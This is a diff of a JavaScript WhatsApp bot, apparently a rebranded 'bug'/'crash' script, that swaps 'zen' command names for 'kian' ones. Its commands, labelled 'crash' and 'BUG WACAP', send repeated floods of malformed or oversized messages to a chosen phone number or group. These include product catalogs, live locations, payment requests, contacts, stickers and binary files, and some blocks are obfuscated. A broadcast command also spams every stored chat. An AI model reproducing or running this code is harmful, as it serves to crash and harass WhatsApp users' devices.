c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x39080c(0x18f)},'businessOwnerJid':'6289514100332@s.whatsapp.net'},'footerText':''+buttonkal}}),{'userJid':m[_0x39080c(0x1a2)],'quoted':m});function _0x4b8f(_0x635405,_0x57e435){var _0x3b16d7=_0x3b16();return _0x4b8f=function(_0x4b8f78,_0x305957){_0x4b8f78=_0x4b8f78-0x18d;var _0x3baff1=_0x3b16d7[_0x4b8f78];return _0x3baff1;},_0x4b8f(_0x635405,_0x57e435);}haikal['relayMessage'](m[_0x39080c(0x1a2)],bugshinchan[_0x39080c(0x198)],{'messageId':bugshinchan[_0x39080c(0x19f)]['id']});
 }
 }
 break
 //=================================================//
-case 'zenbug7': case 'zencrash6': case 'crashar16':{
+case 'kianbug7': case 'kiancrash6': case 'crashar16':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1120,12 +1107,12 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'zenbug8': case 'zencrash7': case 'crashar17': {
+case 'kianbug8': case 'kiancrash7': case 'crashar17': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
@@ -1138,12 +1125,12 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 }
 break
 //=================================================//
-case 'lokas': case 'zenlokas': {
+case 'lokas': case 'kianlokas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1160,12 +1147,12 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 //=================================================//
-case 'buglokas': case 'zenlokas2': {
+case 'buglokas': case 'kianlokas2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1186,7 +1173,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1204,12 +1191,12 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 //=================================================//
-case 'zentroli': {
+case 'kiantroli': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1238,7 +1225,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1297,12 +1284,12 @@ m.reply(tekteka)
 }
 break
 //=================================================//
-case 'zenjagoan' : {
+case 'kianjagoan' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
@@ -1316,7 +1303,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 /*BUG WACAP */
-case 'zenskuy' : {
+case 'kianskuy' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -1341,7 +1328,7 @@ await sleep(20)
 break
 //=================================================//
 /*BUG WACAP */
-case 'gaszen' : {
+case 'gaskian' : {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -1375,51 +1362,51 @@ jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
 a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
 for (let i = 0; i < jumlah ; i++){
-function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20ZENU\x20AIZAK\x20BOYS','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','ZENU\x20AIZAK\x20BOYS','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/GkZVA2qAXhKKJ6phCAVli8','6017EGBulL','1073458pGrfkv','6dptURc','6289514100332','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
+function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20kian\x20AIZAK\x20BOYS','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','kian\x20AIZAK\x20BOYS','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/GkZVA2qAXhKKJ6phCAVli8','6017EGBulL','1073458pGrfkv','6dptURc','6289514100332','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
   await sleep(10000* secon)
 }
 }
 break
-case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'zennih': case 'crashar18': case 'mekdemam': case 'zen1': case 'zen2': case 'zen3': case 'zen4': case 'zen5': case 'zen6': case 'zen7': case 'zen8': case 'zen9': case 'zen10': case 'zen11': case 'zen12': case 'zen13': case 'zen14': case 'zen15': case 'zen16': case 'zen17': case 'zen18': case 'zen19': case 'zen20': case 'zen21': case 'zen22': case 'zen23': case 'zen24': case 'zen25': case 'zen26': case 'zen27': case 'zen28':
-case 'zen29':
-case 'zen30':
-case 'zen31':
-case 'zen32':
-case 'zen33':
-case 'zen34':
-case 'zen35':
-case 'zen36':
-case 'zen37':
-case 'zen38':
-case 'zen39':
-case 'zen40':
-case 'zen41':
-case 'zen42':
-case 'zen43':
-case 'zen44':
-case 'zen45':
-case 'zen46':
-case 'zen47':
-case 'zen48':
-case 'zen49':
-case 'zen50':
-case 'zen51':
-case 'zen52':
-case 'zen53':
-case 'zen54':
-case 'zen55':
-case 'zen56':
-case 'zen57':
-case 'zen58':
-case 'zen59':
-case 'zen60': {
+case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'kiannih': case 'crashar18': case 'mekdemam': case 'kian1': case 'kian2': case 'kian3': case 'kian4': case 'kian5': case 'kian6': case 'kian7': case 'kian8': case 'kian9': case 'kian10': case 'kian11': case 'kian12': case 'kian13': case 'kian14': case 'kian15': case 'kian16': case 'kian17': case 'kian18': case 'kian19': case 'kian20': case 'kian21': case 'kian22': case 'kian23': case 'kian24': case 'kian25': case 'kian26': case 'kian27': case 'kian28':
+case 'kian29':
+case 'kian30':
+case 'kian31':
+case 'kian32':
+case 'kian33':
+case 'kian34':
+case 'kian35':
+case 'kian36':
+case 'kian37':
+case 'kian38':
+case 'kian39':
+case 'kian40':
+case 'kian41':
+case 'kian42':
+case 'kian43':
+case 'kian44':
+case 'kian45':
+case 'kian46':
+case 'kian47':
+case 'kian48':
+case 'kian49':
+case 'kian50':
+case 'kian51':
+case 'kian52':
+case 'kian53':
+case 'kian54':
+case 'kian55':
+case 'kian56':
+case 'kian57':
+case 'kian58':
+case 'kian59':
+case 'kian60': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6289514100332','771192XPifQJ','6289514100332','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/GkZVA2qAXhKKJ6phCAVli8','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZENU\x20AIZAK\x20BOYS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZENU\x20AIZAK\x20BOYS','id':_0x47bf3a(0x153)}}]}));
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6289514100332','771192XPifQJ','6289514100332','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/GkZVA2qAXhKKJ6phCAVli8','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20kian\x20AIZAK\x20BOYS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'kian\x20AIZAK\x20BOYS','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
@@ -1430,15 +1417,15 @@ if (isBan) throw sticBanLu(from)
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-m.reply(`${m.pushName} Hello Saya Bot Zenu Aizak${text ? ': ' + text : ''}`)
+m.reply(`${m.pushName} Hello Saya Bot kian Aizak${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
-case 'zenstik': case 'zenkangbug': case 'buttonkematian': case 'crashar19': {
+case 'kianstik': case 'kiankangbug': case 'buttonkematian': case 'crashar19': {
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -1477,12 +1464,12 @@ m.reply(mess.wait)
 haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
 break
 //=================================================//
-case 'zenbugie': case 'zenkangbug1': case 'crashar20': {
+case 'kianbugie': case 'kiankangbug1': case 'crashar20': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -1552,7 +1539,7 @@ break
 case 'bugbctext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!text) throw `*Type some text*\n\nExample : ${prefix + command} zenuaizak`
+if (!text) throw `*Type some text*\n\nExample : ${prefix + command} kianaizak`
 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
 m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
@@ -1564,12 +1551,12 @@ m.reply('*Success Broadcast*')
 }
 break
 //=================================================//
-case 'zenbutton': case 'zenkangbuttton': case 'testbutton': case 'inibutton': 
+case 'kianbutton': case 'kiankangbuttton': case 'testbutton': case 'inibutton': 
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 const buttons = [
 {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
@@ -1586,7 +1573,7 @@ haikal.sendMessage(m.chat, buttonMessage)
 }
  break
 //=================================================//
-case 'zentag': case 'zenbar':  {
+case 'kiantag': case 'kianbar':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
@@ -1594,12 +1581,12 @@ haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(
 }
 break
 //=================================================//
-case 'hiya': case 'zenoke': {
+case 'hiya': case 'kianoke': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
 haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠 ${ngazap(prefix)}.BIN`, title: `© 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠 ${ngazap(prefix)}.BIN` }, { quoted: doc })
@@ -1607,12 +1594,12 @@ haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-strea
 }
 break
 //=================================================//
-case 'zentod': case 'zenewe': {
+case 'kiantod': case 'kianewe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
